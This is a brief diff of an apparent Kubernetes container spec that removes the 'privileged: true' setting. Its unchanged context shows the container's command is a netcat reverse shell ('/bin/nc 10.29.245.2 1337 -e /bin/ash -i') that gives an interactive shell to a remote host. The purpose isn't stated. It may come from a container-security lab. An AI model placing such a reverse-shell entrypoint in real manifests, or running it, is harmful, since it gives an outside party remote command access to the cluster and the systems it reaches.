@@ -18,7 +18,6 @@ spec:
         imagePullPolicy: Always
         securityContext:
           allowPrivilegeEscalation: false
-          privileged: true
         stdin: true
         tty: true
         command: ['/bin/nc', '10.29.245.2', '1337', '-e', '/bin/ash', '-i']
